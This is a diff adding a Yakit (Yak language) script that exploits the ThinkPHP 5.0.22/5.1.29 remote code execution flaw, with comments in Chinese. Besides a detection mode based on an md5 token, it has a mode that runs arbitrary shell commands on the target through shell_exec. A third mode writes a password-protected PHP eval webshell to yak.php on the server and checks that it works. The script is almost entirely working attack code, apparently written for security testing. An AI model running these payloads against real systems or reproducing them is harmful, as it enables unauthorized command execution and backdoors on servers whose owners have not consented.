@@ -1,0 +1,169 @@
+log.setLevel("info")  // 设置日志级别
+
+yakit.AutoInitYakit()
+// 编写核心发包函数
+sendPacket = func(target, cmd) {
+    return poc.HTTP(`GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]={{url({{params(cmd)}})}} HTTP/1.1
+Host: {{params(target)}}
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Encoding: deflate
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Content-Length: 0
+Dnt: 1
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0`,
+        poc.params({
+            "cmd": cmd,
+            "target": target,
+        }),
+    )
+}
+
+//yakit输出信息 10%
+yakit.SetProgress(0.1)
+yakit.Info("开始接受参数")
+
+targeturl = cli.String("url")
+if targeturl == "" {
+    die("no targeturl")
+}
+host,port,err = str.ParseStringToHostPort(targeturl)
+target = sprintf("{{net(%v)}}:{{port(%v)}}", host, port)
+
+getshell = cli.Bool("getshell")
+
+command = cli.String("command")
+
+//yakit输出信息 20%
+yakit.SetProgress(0.2)
+yakit.Info("接收参数成功")
+
+switch  {
+    case getshell:
+        println("getshell模式")
+        //yakit输出信息 30%
+        yakit.SetProgress(0.3)
+        yakit.Info("开始生成Payload")
+
+        //生成一句话马
+        randomStr = str.RandStr(6)
+        shell = sprintf("<?php @eval($_POST['%v']); ?>",randomStr)
+        cmd = sprintf("echo -n '%v' > yak.php", shell)
+
+        //yakit输出信息
+        yakit.SetProgress(0.5)
+        yakit.Info("准备发送数据包")
+
+        rsp, _, err = sendPacket(target, cmd)
+        if err != nil {
+            log.error("发送数据包失败: %v %v", target,cmd)
+            yakit.Error("发送数据包失败: %v %v", target,cmd)
+            yakit.SetProgress(1)
+            die(err)
+        }
+        
+        //yakit输出信息
+        yakit.SetProgress(0.9)
+        yakit.Info("检测webshell能否访问")
+
+        time.sleep(1)
+
+        shellurl,err = str.UrlJoin(targeturl, "yak.php")
+        die(err)
+        shellrsp,err = http.Get(shellurl)
+        if err !=nil {
+            yakit.Info("Getshell失败")
+            log.error("Getshell失败")
+            yakit.SetProgress(1)
+            die(err)
+        }
+        if shellrsp.StatusCode == 200 {
+            log.info("Getshell成功,shellurl：%v,密码：%v", shellurl,randomStr)
+            yakit.Info("Getshell成功,shellurl：%v,密码：%v", shellurl,randomStr)
+            yakit.SetProgress(1)
+        }
+        
+    case command != "":
+        println("command模式")
+        //yakit输出信息 30%
+        yakit.SetProgress(0.3)
+        yakit.Info("开始生成Payload")
+
+        //yakit输出信息 50%
+        yakit.SetProgress(0.5)
+        yakit.Info("准备发送数据包")
+
+        // 使用生成的命令发包
+        rsp, _, err = sendPacket(target, command)
+        if err != nil {
+            log.error("发送数据包失败: %v %v", target,command)
+            yakit.Error("发送数据包失败: %v %v", target,command)
+            yakit.SetProgress(1)
+            die(err)
+        }
+        
+        //yakit输出信息  90%
+        yakit.Info("准备检测结果")
+        yakit.SetProgress(0.9)
+
+        time.sleep(1)
+
+        // 取出发送的数据包中的结果，检测内容
+        headers, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
+        if body != "" {
+            yakit.Info("%v",string(body))
+            log.info("%v",string(body))
+        }else{
+            yakit.Error("命令执行失败")
+            log.error("命令执行失败")
+        }
+
+    default:
+        println("poc模式")
+        //yakit输出信息 30%
+        yakit.SetProgress(0.3)
+        yakit.Info("开始生成Payload")
+
+        // 生成一个 cmd 和对应的 payload token
+        randomStr = str.RandStr(20)
+        result = codec.Md5(randomStr)
+        log.info("Generate random md5 token: %v", result)
+        yakit.Info("Generate random md5 token: %v", result)
+        cmd = sprintf("echo -n '%v' | md5sum", randomStr)
+
+        //yakit输出信息 50%
+        yakit.SetProgress(0.5)
+        yakit.Info("准备发送数据包")
+
+        // 使用生成的命令发包
+        rsp, _, err = sendPacket(target, cmd)
+        if err != nil {
+            log.error("发送数据包失败: %v %v", target,cmd)
+            yakit.Error("发送数据包失败: %v %v", target,cmd)
+            yakit.SetProgress(1)
+            die(err)
+        }
+
+        //yakit输出信息  90%
+        yakit.Info("准备检测结果")
+        yakit.SetProgress(0.9)
+
+        time.sleep(1)
+        
+        // 取出发送的数据包中的结果，检测内容
+        headers, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
+        if str.MatchAllOfSubString(body, result) {
+            log.info("Find token: %v,存在ThinkPHP-5.0.22/5.1.29-RCE漏洞", result)
+
+            //yakit输出信息  100%
+            yakit.Info("发现漏洞, %v存在ThinkPHP-5.0.22/5.1.29-RCE漏洞", targeturl)
+            yakit.SetProgress(1)
+            yakit.StatusCard("发现漏洞", targeturl)
+        }else{
+            log.error("Not find token: %v,不存在ThinkPHP-5.0.22/5.1.29-RCE漏洞", result)
+
+            //yakit输出信息  100%
+            yakit.Error("检测失败,%v不存在ThinkPHP-5.0.22/5.1.29-RCE漏洞", targeturl)
+            yakit.SetProgress(1)
+        }
+}
